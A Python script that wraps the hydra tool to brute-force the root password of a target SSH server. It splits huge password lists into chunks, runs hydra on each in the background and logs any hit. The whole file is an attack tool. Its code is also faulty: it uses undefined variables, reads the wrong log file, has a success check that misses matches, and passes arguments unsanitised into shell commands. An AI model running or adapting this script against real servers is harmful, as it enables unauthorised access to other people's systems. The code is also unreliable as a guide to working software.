#!/usr/bin/python3

import os
import sys
import getopt
import time

options, ars = getopt.getopt(sys.argv[1:], 'hRt:p:i:')
target = ""
port = ""
inputFile = ""
helpOption = 0
restart = 0


def inputFileProcessing(inputFile):
    fileList = []
    with open(inputFile, "r", encoding = "utf-8") as f:
        originalData = f.readlines()
        if len(originalData)>50000000:
            cnt = 1
            fileName_Num = 0
            fileList.append(inputFile+"_"+"0")

            for line in originalData:
                fileName = inputFile + "_" + str(fileName_Num)  
                

                fw = open(fileName, "a")
                fw.write(line)
                fw.close()

                if cnt == 50000000:
                    fileName_Num +=  1
                    fileName = inputFile + "_" + str(fileName_Num)   
                    fileList.append(fileName)
                    cnt = 0

                cnt += 1
        else:
            fileList.append(inputFile)
    
    return fileList
                


    

for op ,p in options:
    if op == '-h':
        print("Options \n\n -t : target \n -p : port number \n -i : input file location \n -R : restart program \n log file name : nohup.out")
        helpOption += 1
    elif op == '-t':
        target = p
    elif op == '-p':
        port = p
    elif op == '-i':
        inputFile = p
    elif op == '-R':
        restart+=1        

def bruteForcing(file):
    fLog = open("bfLog.txt","a")
    now = time.localtime()
    nowTime = "%04d/%02d/%02d %02d:%02d:%02d" % (now.tm_year, now.tm_mon, now.tm_mday, now.tm_hour, now.tm_min, now.tm_sec)
    fLog.write(nowTime + " "+ file + " start")
    os.system('nohup hydra -l root -P '+ file + ' -f '+ target + " ssh -s " + port +" &")
    fLog.close()

if helpOption == 0 and restart == 0:
    fileList = inputFileProcessing(inputFile)
    print(fileList) 
    for file in fileList:
        bruteForcing(file)
        fLog = open("bfLog.txt","a")
        fNohup = open("nohup.out","r")
        outputData = fNohup.readlines()
        if "valid password found" in outputData:
            fLog.write("1 result has found in nohup")
            fNohup.close()
            fLog.close()
             

        else:
            nowTime = "%04d/%02d/%02d %02d:%02d:%02d" % (now.tm_year, now.tm_mon, now.tm_mday, now.tm_hour, now.tm_min, now.tm_sec)
            fLog.write(nowTime + " " + file + " end")
            fLog.write("no password found")
            fNohup.close()
            os.system("rm -rf nohup.out")
        fLog.close()

elif helpOption == 0 and restart == 1:
    fLog = open("bLog.txt","r")
    fileData = fLog.readlines()
    fLog.close()


    fileList = inputFileProcessing(inputFile)
    fileIndex = fileList.index(lastFileName)
    fileList = fileList[5:]
    for file in fileList:
        bruteForcing(file)
        fLog = open("bfLog.txt","a")
        fNohup = open("nohup.out","r")
        outputData = fNohup.readlines()
        if "valid password found" in outputData:
            fLog.write("1 result has found in nohup")
            fNohup.close()
            fLog.close()

        else:
            nowTime = "%04d/%02d/%02d %02d:%02d:%02d" % (now.tm_year, now.tm_mon, now.tm_mday, now.tm_hour, now.tm_min, now.tm_sec)
            fLog.write(nowTime + " " + file + " end")
            fLog.write("no password found")
            fNohup.close()
            os.system("rm -rf nohup.out")
        fLog.close()

    
